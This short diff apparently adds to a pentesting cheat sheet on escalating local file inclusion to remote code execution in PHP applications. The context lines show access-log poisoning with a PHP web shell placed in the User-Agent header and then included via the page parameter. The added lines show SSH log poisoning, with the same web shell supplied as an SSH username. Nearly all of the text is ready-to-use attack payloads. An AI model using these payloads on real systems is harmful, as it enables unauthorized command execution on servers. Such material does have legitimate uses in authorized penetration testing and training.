@@ -22,3 +22,6 @@ LFI + file upload to RCE
     - intercept it: http://example.com/index.php?page=/var/log/access.log
     - in Burp--User-Agent, add: <?php echo system($_GET['cmd']); exit; ?>
     - http://example.com/index.php?page=/var/log/access.log&cmd=pwd
+* SSH log poisoning
+    - ssh <?php echo system($_GET['cmd']); exit; ?>@<ip>
+    - http://example.com/index.php?page=/var/log/access.log&cmd=pwd
